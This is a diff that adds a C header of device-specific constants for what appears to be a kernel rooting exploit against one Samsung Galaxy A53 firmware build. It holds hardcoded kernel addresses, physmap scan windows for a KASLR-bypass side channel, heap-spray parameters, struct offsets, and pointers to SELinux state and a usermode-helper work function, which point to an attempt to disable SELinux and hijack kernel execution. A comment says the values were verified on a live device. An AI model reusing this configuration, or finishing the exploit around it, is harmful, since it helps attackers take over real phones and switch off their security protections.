@@ -1,0 +1,89 @@
+#ifndef ROOT_MY_GALAXY_TARGET_H
+#define ROOT_MY_GALAXY_TARGET_H
+
+#define TARGET_MODEL "SM-A536E"
+#define TARGET_BUILD "A536EXXSNGZG3"
+#define TARGET_KERNEL_RELEASE \
+    "5.10.237-android12-9-31999025-abA536EXXSNGZG3"
+
+#define PAGE_SIZE 4096
+#define MAX_PHYSICAL_SLIDE 0x3f00000ULL
+#define PHYSICAL_SLIDE_ALIGNMENT 0x8000ULL
+#define PHYS_OFFSET 0x80000000ULL
+#define PAGE_OFFSET 0xffffff8000000000ULL
+#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
+#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
+#define MM_NORMAL_ALIAS_START 0xffffff8800000000ULL
+#define MM_NORMAL_ALIAS_END 0xffffff8980000000ULL
+#define KERNEL_TEXT_MIN 0xffffffc000000000ULL
+#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
+#define INIT_MM_IMAGE 0xffffffc009f64f38ULL
+#define MM_PGD_OFF 0x48ULL
+
+#define MM_STRUCT_SZ 0x3c0
+#define MM_ORDER 3
+#define MM_PARTIALS 5
+#define APPENDED_FUTEXES 2048
+#define REPEAT_MEASUREMENT 64
+#define AVERAGE 8
+#define KERNELSNITCH_BASELINE_SAMPLES 8
+#define KERNELSNITCH_BASELINE_QUANTILE 1
+#define A536_PAGE_SCAN_MAX 256
+#define A536_DMA32_SKIP_SLABS 8
+#define A536_TRIGGER_SLABS 24
+#define A536_SKB_SENDS 256
+#define A536_SKB_SNDBUF 8388608
+
+/*
+ * KernelSnitch identity scan windows.  DEVICE-SPECIFIC: derive them once
+ * per firmware (PTE-walk / oracle on a rooted unit; the linear map does not
+ * move with the KASLR slide), then hardcode here.  Only the physmap windows
+ * matter for the mm_struct scan; the kernel-image window is not needed.
+ * Verified live on A536EXXSNGZG3: low physmap 2GB, high physmap measured
+ * ~1.5GB; the 2GB high window is kept for margin.
+ */
+#define KERNELSNITCH_IDENTITY_WINDOWS { \
+    { MM_DMA32_ALIAS_START, MM_DMA32_ALIAS_END }, \
+    { MM_NORMAL_ALIAS_START, MM_NORMAL_ALIAS_END }, \
+}
+
+#define INIT_TASK_BASE 0xffffff8001e0dd00ULL
+#define SELINUX_STATE_ALIAS 0xffffff80021ddb68ULL
+#define ASHMEM_MISC_FOPS_ALIAS 0xffffff8001ffbc20ULL
+#define ASHMEM_FOPS_IMAGE 0xffffffc009b06f18ULL
+#define SYSTEM_UNBOUND_WQ_ALIAS 0xffffff8001df9e10ULL
+#define PWQ_CACHE_ALIAS 0xffffff800207fca8ULL
+#define CALL_USERMODEHELPER_EXEC_WORK_IMAGE 0xffffffc0080f6be4ULL
+
+#define SELINUX_LIVE_QWORD 0x0000000000010000ULL
+#define CFG_PAGE_OFF 0x10
+#define CFG_NEEDS_READ_FILL_OFF 0x50
+#define CFG_BIN_BUFFER_OFF 0x58
+#define CFG_BIN_BUFFER_SIZE_OFF 0x60
+#define CFG_CB_MAX_SIZE_OFF 0x64
+#define KMEM_CACHE_USERSIZE_OFF 0xf8
+#define WQ_DFL_PWQ_OFF 0xb0
+#define PWQ_POOL_OFF 0x00
+#define PWQ_WQ_OFF 0x08
+#define PWQ_WORK_COLOR_OFF 0x10
+#define PWQ_REFCNT_OFF 0x18
+#define PWQ_NR_IN_FLIGHT_OFF 0x1c
+#define PWQ_NR_ACTIVE_OFF 0x58
+#define PWQ_MAX_ACTIVE_OFF 0x5c
+#define POOL_WORKLIST_OFF 0x20
+#define POOL_NR_IDLE_OFF 0x34
+#define WORK_ENTRY_OFF 0x08
+#define WORK_FUNC_OFF 0x18
+
+#define ASHMEM_FOPS_08_IMAGE 0xffffffc0083789dcULL
+#define ASHMEM_FOPS_10_IMAGE 0xffffffc008447488ULL
+#define ASHMEM_FOPS_18_IMAGE 0xffffffc0084478e8ULL
+#define ASHMEM_FOPS_50_IMAGE 0xffffffc008c378e8ULL
+#define ASHMEM_FOPS_58_IMAGE 0xffffffc008c3823cULL
+#define ASHMEM_FOPS_60_IMAGE 0xffffffc008c38294ULL
+#define ASHMEM_FOPS_70_IMAGE 0xffffffc008c384c4ULL
+#define ASHMEM_FOPS_80_IMAGE 0xffffffc008c38548ULL
+#define ASHMEM_FOPS_C8_IMAGE 0xffffffc0083c3ad8ULL
+#define ASHMEM_FOPS_E0_IMAGE 0xffffffc008c38668ULL
+
+#endif
